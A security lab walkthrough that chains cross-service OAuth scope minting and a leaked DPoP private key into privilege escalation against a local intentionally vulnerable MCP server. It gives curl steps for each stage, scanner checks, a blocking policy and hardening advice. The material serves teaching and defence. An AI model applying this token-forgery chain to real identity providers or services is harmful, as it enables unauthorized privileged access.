# Walkthrough 10: Token Cross-Pollution and Shared Identity

How a shared OAuth2 identity provider becomes a cross-service privilege
escalation surface — and how DPoP token binding fails when the key leaks.

**Time:** 15 minutes
**Labs:** `shared_idp_pollution_lab` (MCP-T42) + `dpop_forgery_lab` (MCP-T43)

---

## The Pattern

```
Service A ──(shared IdP)──► token with service-A scope
Service B ──(same IdP)───► token with service-B scope

Question: Can Service A ask the IdP for a token that contains
          service-B's scope? If scope isolation is not enforced
          at minting time — yes.

DPoP binding should prevent replay:
  token is bound to a private key
  private key never leaves the original machine

Question: What if the private key leaks in a config endpoint?
          DPoP binding is gone. Any caller with the key can forge
          a proof and replay the token from anywhere.
```

These two patterns routinely co-occur in enterprise AI-Ops deployments.
The shared IdP is chosen for operational convenience (one OIDC tenant,
one admin console). The DPoP requirement was added by the security team
to prevent token theft. Neither control accounts for the other's failure
mode.

---

## Step 1 — Discover the Shared IdP

```bash
# Start camazotz
make up

# Easy difficulty
curl -sf http://localhost:8080/config \
  -H 'Content-Type: application/json' \
  -d '{"difficulty": "easy"}'

# Retrieve service config for the platform agent
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {
      "name": "platform.get_service_config",
      "arguments": {
        "service_name": "platform-agent",
        "include_credentials": true
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('service:', d.get('service_name'))
print('idp_url:', d.get('idp_url','')[:60])
print('shared_idp_hint:', d.get('shared_idp_hint','')[:120])
print('cross_service_access:', d.get('_cross_service_access'))
"
```

**What to look for:** `shared_idp_hint` will tell you that the security
agent and SRE agent share the same IdP tenant. `cross_service_access: True`
confirms scope isolation is not enforced. On hard, the IdP returns only
the calling service's own config — other services are not visible.

---

## Step 2 — Confirm Cross-Service Token Minting

```bash
# Ask the IdP to mint a token with security-agent:admin scope
# while authenticating as platform-agent
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {
      "name": "platform.mint_token",
      "arguments": {
        "service": "platform-agent",
        "requested_scope": "security-agent:admin"
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('token_issued:', bool(d.get('token')))
print('scope_granted:', d.get('scope_granted'))
print('cross_service_scope:', d.get('_cross_service_scope'))
print('scope_pollution:', d.get('_scope_pollution'))
"
```

**What to look for:** `scope_granted` contains `security-agent:admin` even
though the authenticating service is `platform-agent`. This is the IdP
pollution gap — the token is technically valid (signed by the IdP), but
it carries a scope the requesting service should never hold.

---

## Step 3 — Privilege Escalation via Polluted Token

```bash
# Use the polluted token to execute a privileged action
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {
      "name": "platform.execute_privileged_op",
      "arguments": {
        "token": "<token-from-step-2>",
        "operation": "read_security_audit_log"
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))
print('flag:', d.get('flag','')[:60])
print('scope_accepted:', d.get('_scope_accepted'))
"
```

**What you see:** The security audit log is returned — the platform agent
now holds security-agent:admin scope and the application layer accepts it.
The flag confirms successful cross-service privilege escalation.

---

## Step 4 — Extract the Leaked DPoP Key

Switching focus to MCP-T43: the same service config endpoint that exposed
cross-service IdP config also leaks a DPoP private key fragment.

```bash
# DPoP service info — note the key hint in the response
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 4, "method": "tools/call",
    "params": {
      "name": "dpop.get_service_info",
      "arguments": {"service_id": "deploy-service"}
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('service_id:', d.get('service_id'))
print('dpop_endpoint:', d.get('dpop_endpoint','')[:60])
print('dpop_key_hint:', d.get('dpop_key_hint','')[:100])
print('key_leaked:', d.get('_key_leaked'))
"
```

**What to look for:** `dpop_key_hint` contains material that can be used
as `key_material` in the proof-signing step. The `_key_leaked` flag
confirms the vulnerability. On hard, the key is replaced with a hash of
the public JWK — no usable material.

---

## Step 5 — Forge a DPoP Proof and Replay the Token

```bash
# Attempt to access protected resource without DPoP — will be denied
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 5, "method": "tools/call",
    "params": {
      "name": "dpop.request_access",
      "arguments": {
        "service_id": "deploy-service",
        "token": "bearer-token-example"
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))     # denied — DPoP required
"

# Sign a forged proof using the leaked key material
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 6, "method": "tools/call",
    "params": {
      "name": "dpop.sign_proof",
      "arguments": {
        "service_id": "deploy-service",
        "key_material": "leaked-private-key-from-config",
        "htm": "GET",
        "htu": "http://deploy-service/api/deploy"
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('proof_signed:', bool(d.get('dpop_proof')))
print('proof:', d.get('dpop_proof','')[:80])
"

# Replay with forged proof
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 7, "method": "tools/call",
    "params": {
      "name": "dpop.access_resource",
      "arguments": {
        "service_id": "deploy-service",
        "token": "bearer-token-example",
        "dpop_proof": "forged-proof-from-step-6",
        "resource": "deploy-api"
      }
    }
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
d = json.loads(r['result']['content'][0]['text'])
print('access_granted:', d.get('access_granted'))
print('flag:', d.get('flag','')[:60])
print('forgery_succeeded:', d.get('_flags',{}).get('dpop_forgery_succeeded'))
"
```

**What you see:** `access_granted: True` and the flag. The DPoP binding
provided no protection because the private key leaked in the same config
endpoint that exposed the IdP cross-service data. The attacker combined
both findings — IdP scope pollution + DPoP key leak — in a single chain.

---

## Scanning with mcpnuke

Both vulnerabilities are detectable with mcpnuke before any tool
invocation:

```bash
# Static scan — no tool calls, instant
mcpnuke --targets http://localhost:8080/mcp \
  --no-invoke \
  --profile profiles/camazotz.json \
  --verbose

# Expected findings:
# CRITICAL  credential_in_schema    dpop_key_hint in dpop.get_service_info schema
# HIGH      config_dump             shared_idp config exposed in platform.get_service_config
# MEDIUM    token_theft             dpop.sign_proof accepts key_material from caller

# DPoP enforcement check — detects missing server-side validation
mcpnuke --targets http://localhost:8080/mcp \
  --coverage 10 \
  --profile profiles/camazotz.json \
  --verbose --json dpop-findings.json
```

The `dpop_enforcement` check sends three probes:
1. No `DPoP` header — should return 401 (easy returns 200)
2. Malformed JWT — should return 400 (easy returns 200)
3. Missing `htm`/`htu` claims — should return 400 (easy returns 200)

All three failures surface as findings in the report.

---

## Defending with nullfield

```yaml
apiVersion: nullfield.io/v1alpha1
kind: NullfieldPolicy
metadata:
  name: shared-idp-dpop-policy
  namespace: camazotz
spec:
  rules:
    # Block cross-service scope minting
    - action: DENY
      match:
        tool: "platform.mint_token"
        request:
          scope_prefix_not_in: ["platform-agent:", "platform:read", "platform:write"]
      reason: "Token scope must stay within platform-agent service boundary."

    # Redact DPoP key material from service config responses
    - action: SCOPE
      match:
        tool: "dpop.get_service_info"
      scope:
        response:
          redactPatterns:
            - "dpop_key_hint"
            - "private_key"
            - "key_material"
      reason: "DPoP private key material must not appear in tool responses."

    # Block URL arguments in DPoP tools (SSRF via open redirect)
    - action: SCOPE
      match:
        tool: "dpop.*"
      scope:
        request:
          blockRedirects: true
      reason: "DPoP tools must not follow URL redirects."

    # Require DPoP proof on resource access
    - action: DENY
      match:
        tool: "dpop.access_resource"
        request:
          missing_field: "dpop_proof"
      reason: "Resource access requires a DPoP proof."
```

---

## Hard Mode

On hard difficulty, both labs enforce the defense:

**MCP-T42 hard:** The IdP checks the requesting service's scope allowlist.
`platform-agent` requesting `security-agent:admin` returns `status: denied`
with `_scope_rejected: True`. The polluted token is never issued.

**MCP-T43 hard:** The service validates the DPoP key fingerprint against a
registered JWK set. Proofs signed with an unregistered key return
`access_granted: False` with `_key_not_registered: True`. The leaked key
material from `get_service_info` is replaced with a public JWK hash —
no usable private key is exposed.

---

## Production Takeaways

**Shared IdP:**
- Enforce per-service scope allowlists at the IdP, not just at the
  application layer. ZITADEL, Keycloak, and Okta all support per-application
  scope restriction.
- Audit token issuance logs for cross-service scope grants — these should
  never appear in a correctly configured deployment.
- In a microservices AI architecture, treat each agent as a separate
  application registration — not a shared client credential.

**DPoP:**
- DPoP private keys must be stored in hardware-backed key material (HSM,
  TPM, or OS keychain) — never in environment variables, config files, or
  API responses.
- Key rotation and revocation must be automatic. A leaked key that cannot
  be quickly rotated means the DPoP binding is permanently broken.
- mcpnuke's DPoP enforcement check validates the *server* side — that the
  MCP server actually rejects requests without valid DPoP proofs. A server
  that accepts bare bearers despite advertising DPoP support is functionally
  unprotected.

**Combined chain:**
- Scope pollution + key leak is a force multiplier. Scope pollution alone
  gives the attacker a token with too-wide scope. Key leak alone gives the
  attacker the ability to replay any token from any machine. Combined, the
  attacker can mint a cross-service token, forge a DPoP proof for it, and
  replay it against any protected endpoint — from any machine, at any time.
